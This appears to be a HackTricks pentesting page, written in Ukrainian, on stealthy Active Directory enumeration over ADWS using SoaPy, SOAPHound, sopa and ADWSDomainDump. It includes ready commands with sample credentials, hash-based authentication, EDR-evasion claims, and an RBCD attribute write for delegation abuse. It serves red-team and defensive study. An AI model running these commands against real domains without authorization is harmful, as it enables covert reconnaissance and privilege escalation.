# Перерахування Active Directory Web Services (ADWS) і прихований збір даних

{{#include ../../banners/hacktricks-training.md}}

## Що таке ADWS?

Active Directory Web Services (ADWS) **типово увімкнено на кожному Domain Controller починаючи з Windows Server 2008 R2**, і він прослуховує TCP-порт **9389**.  Попри назву, **HTTP не використовується**.  Натомість сервіс надає доступ до даних у стилі LDAP через стек пропрієтарних .NET-протоколів фреймування:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсулюється всередині цих бінарних SOAP-фреймів і передається через нетиповий порт, **перерахування через ADWS значно рідше перевіряється, фільтрується або розпізнається за сигнатурами, ніж класичний LDAP-трафік через порти 389 і 636**.  Для операторів це означає:<sup>[[1]](#references)[[7]](#references)</sup>

* Прихованіший recon – Blue teams часто зосереджуються на LDAP-запитах.
* Можливість збирати дані з **не-Windows хостів (Linux, macOS)** шляхом тунелювання 9389/TCP через SOCKS proxy.
* Ті самі дані, які можна отримати через LDAP (користувачі, групи, ACL, схема тощо), а також можливість виконувати **записи** (наприклад, `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодія з ADWS реалізована через WS-Enumeration: кожен запит починається повідомленням `Enumerate`, яке визначає LDAP-фільтр/атрибути та повертає GUID `EnumerationContext`, після чого одне або кілька повідомлень `Pull` потоково передають результати в межах вікна, визначеного сервером.<sup>[[7]](#references)</sup> Контексти стають недійсними приблизно через 30 хвилин, тому інструментам потрібно або розбивати результати на сторінки, або розділяти фільтри (запити за префіксом для кожного CN), щоб не втратити стан.<sup>[[8]](#references)</sup> Під час запиту дескрипторів безпеки вкажіть control `LDAP_SERVER_SD_FLAGS_OID`, щоб не включати SACL; інакше ADWS просто вилучить атрибут `nTSecurityDescriptor` зі своєї SOAP-відповіді.

> ПРИМІТКА: ADWS також використовується багатьма інструментами RSAT GUI/PowerShell, тому такий трафік може виглядати як легітимна адміністративна активність.

## SoaPy – нативний Python-клієнт

[SoaPy](https://github.com/logangoins/soapy) – це **повторна повна реалізація протоколу ADWS на чистому Python**.  Він формує фрейми NBFX/NBFSE/NNS/NMF побайтно, забезпечуючи збір даних із Unix-подібних систем без використання .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Основні можливості

* Підтримка **проксіювання через SOCKS** (корисно для C2 implants).
* Точні пошукові фільтри, ідентичні LDAP `-q '(objectClass=user)'`.
* Необов’язкові операції **запису** (`--set` / `--delete`).
* Режим виводу **BOFHound** для безпосереднього імпорту в BloodHound.
* Прапорець `--parse` для зручнішого відображення часових міток / `userAccountControl`, коли потрібна зрозумілість для людини.<sup>[[2]](#references)</sup>

### Прапорці цільового збору даних і операції запису

SoaPy містить спеціалізовані перемикачі, що відтворюють найпоширеніші LDAP hunting-задачі через ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, а також параметри `--query` / `--filter` для довільних запитів. Поєднуйте їх із примітивами запису, такими як `--rbcd <source>` (встановлює `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (підготовка SPN для targeted Kerberoasting) і `--asrep` (вмикає `DONT_REQ_PREAUTH` у `userAccountControl`).<sup>[[2]](#references)</sup>

Приклад targeted SPN hunt, який повертає лише `samAccountName` і `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Використовуйте той самий хост/облікові дані, щоб негайно weaponise результати: виведіть об’єкти, здатні до RBCD, за допомогою `--rbcds`, а потім застосуйте `--rbcd 'WEBSRV01$' --account 'FILE01$'`, щоб підготувати ланцюжок Resource-Based Constrained Delegation (повний шлях зловживання див. у [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Інсталяція (хост оператора)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Fork `ldapdomaindump`, що замінює LDAP-запити на виклики ADWS через TCP/9389 для зменшення кількості спрацьовувань LDAP-signature.
* Виконує початкову перевірку доступності 9389, якщо не передано `--force` (пропускає probe, якщо сканування портів створює багато шуму або фільтрується).
* Протестовано проти Microsoft Defender for Endpoint і CrowdStrike Falcon з успішним bypass у README.<sup>[[4]](#references)</sup>

### Встановлення
```bash
pipx install .
```
### Використання
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Типовий вивід реєструє перевірку доступності 9389, ADWS bind і початок/завершення dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Практичний клієнт для ADWS на Golang

Подібно до soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколів ADWS (MS-NNS + MC-NMF + SOAP) на Golang і надає прапорці командного рядка для виконання викликів ADWS, таких як:<sup>[[5]](#references)</sup>

* **Пошук і отримання об’єктів** - `query` / `get`
* **Життєвий цикл об’єктів** - `create [user|computer|group|ou|container|custom]` і `delete`
* **Редагування атрибутів** - `attr [add|replace|delete]`
* **Керування обліковими записами** - `set-password` / `change-password`
* та інші, зокрема `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` тощо.

### Основні моменти зіставлення протоколів

* Пошук у стилі LDAP виконується через **WS-Enumeration** (`Enumerate` + `Pull`) із проєкцією атрибутів, керуванням областю (Base/OneLevel/Subtree) і пагінацією.
* Отримання одного об’єкта виконується через **WS-Transfer** `Get`; зміни атрибутів - через `Put`; видалення - через `Delete`.
* Вбудоване створення об’єктів використовує **WS-Transfer ResourceFactory**; для custom objects використовується **IMDA AddRequest**, керований шаблонами YAML.
* Операції з паролями використовують дії **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Виявлення метаданих без автентифікації (mex)

ADWS надає WS-MetadataExchange без облікових даних, що є швидким способом перевірити доступність сервісу перед автентифікацією:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Нотатки щодо виявлення DNS/DC та targeting Kerberos

Sopa може визначати DC через SRV, якщо `--dc` не вказано, а `--domain` надано. Вона виконує запити в такому порядку та використовує target із найвищим пріоритетом:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Операційно надавайте перевагу резолверу, контрольованому DC, щоб уникнути збоїв у сегментованих середовищах:

* Використовуйте `--dns <DC-IP>`, щоб **усі** SRV/PTR/forward-запити проходили через DNS DC.
* Використовуйте `--dns-tcp`, коли UDP заблоковано або відповіді SRV великі.
* Якщо Kerberos увімкнено, а `--dc` є IP-адресою, sopa виконує **зворотний PTR-запит**, щоб отримати FQDN для коректного визначення цільових SPN/KDC. Якщо Kerberos не використовується, PTR-запит не виконується.

Приклад (IP + Kerberos, примусовий DNS через DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Варіанти матеріалів автентифікації

Окрім паролів у відкритому вигляді, sopa підтримує **NT hashes**, **Kerberos AES keys**, **ccache** і **PKINIT certificates** (PFX або PEM) для автентифікації ADWS. Kerberos мається на увазі під час використання `--aes-key`, `-c` (ccache) або параметрів на основі сертифікатів.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Створення користувацьких об’єктів через шаблони

Для довільних класів об’єктів команда `create custom` використовує YAML-шаблон, який відповідає IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` і `rdn` визначають контейнер і відносне DN.
* `attributes[].name` підтримує `cn` або просторове ім’я `addata:cn`.
* `attributes[].type` приймає `string|int|bool|base64|hex` або явний `xsd:*`.
* Не додавайте `ad:relativeDistinguishedName` або `ad:container-hierarchy-parent`; sopa вставляє їх автоматично.
* Значення `hex` перетворюються на `xsd:base64Binary`; використовуйте `value: ""`, щоб встановити порожні рядки.

## SOAPHound – високопродуктивний збір даних ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — це .NET collector, який виконує всі LDAP-взаємодії через ADWS і створює JSON, сумісний із BloodHound v4. Спочатку він створює повний cache об’єктів `objectSid`, `objectGUID`, `distinguishedName` і `objectClass` (`--buildcache`), а потім повторно використовує його для високопродуктивних проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (інтегрований з AD DNS), тому з DC назовні передається лише близько 35 критичних атрибутів. AutoSplit (`--autosplit --threshold <N>`) автоматично розподіляє запити за префіксом CN, щоб у великих лісах не перевищити 30-хвилинний timeout EnumerationContext.<sup>[[8]](#references)</sup>

Типовий workflow на VM оператора, під’єднаній до домену:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Експортовані JSON slots безпосередньо у workflows SharpHound/BloodHound — див. [методологію BloodHound](bloodhound.md) для подальших ідей щодо побудови графів. AutoSplit робить SOAPHound стійким під час роботи з лісами на мільйони об’єктів, водночас зменшуючи кількість запитів порівняно зі snapshot’ами в стилі ADExplorer.

## Stealth AD Collection Workflow

Наведений нижче workflow показує, як перелічити **об’єкти домену та ADCS** через ADWS, перетворити їх на JSON BloodHound і шукати attack paths на основі сертифікатів — усе з Linux:

1. **Прокиньте 9389/TCP** із цільової мережі на свою машину (наприклад, через Chisel, Meterpreter, SSH dynamic port-forward тощо).  Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або використайте `--proxyHost/--proxyPort` у SoaPy.

2. **Зберіть об’єкт кореневого домену:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Зберіть об’єкти, пов’язані з ADCS, із Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Перетворіть у BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Завантажте ZIP** у графічний інтерфейс BloodHound і виконайте cypher-запити, наприклад `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації сертифікатів (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Об’єднайте це з `s4u2proxy`/`Rubeus /getticket` для повного ланцюжка **Resource-Based Constrained Delegation** (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Зведення інструментів

| Призначення | Інструмент | Примітки |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Високопродуктивний ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, режими BH/ADCS/DNS |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Конвертує логи SoaPy/ldapsearch |
| Компрометація сертифікатів | [Certipy](https://github.com/ly4k/Certipy) | Може працювати через той самий SOCKS |
| ADWS enumeration і зміни об’єктів | [sopa](https://github.com/Macmod/sopa) | Generic client для взаємодії з відомими кінцевими точками ADWS - дозволяє виконувати enumeration, створення об’єктів, зміни атрибутів і зміну паролів |

## Посилання

- [1] [SpecterOps – Обов’язково використовуйте SOAP(y) – посібник оператора зі stealthy AD collection через ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – специфікації MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy Enumeration середовищ Active Directory через ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – інструмент SOAPHound для збору даних Active Directory через ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
